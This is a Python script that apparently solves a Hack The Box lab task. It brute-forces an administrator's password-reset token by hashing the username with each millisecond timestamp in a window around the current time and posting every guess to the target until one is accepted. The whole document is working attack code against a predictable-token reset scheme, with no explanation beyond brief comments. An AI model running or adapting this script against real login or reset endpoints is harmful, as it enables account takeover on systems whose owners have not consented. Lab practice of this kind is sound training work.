from hashlib import md5
import requests
from sys import exit
import time

url = "http://94.237.62.195:32655/question1/"

# to have a wide window try to bruteforce starting from 1 second ago
# being that we are multiplying by 1000 the difference of 1 second is now equivalent to 1000
now        = int(time.time() * 1000) 
start_time = now - 2250
fail_text  = "Wrong token"
user = "htbadmin"

# Send POST request of clicking the create reset token for htbuser button
data_for_htbuser = {
	"submit": "htbuser"
	}
requests.post(url, data=data_for_htbuser)

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, now + 2250):
    # get token md5
    token = user + str(x)
    md5_token = md5(token.encode()).hexdigest()
    data_for_htbadmin = {
        "token": md5_token,
        "submit": "check"
    }

    print("checking {} {}".format(token, md5_token))

    # send the request 
    res = requests.post(url, data=data_for_htbadmin)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()
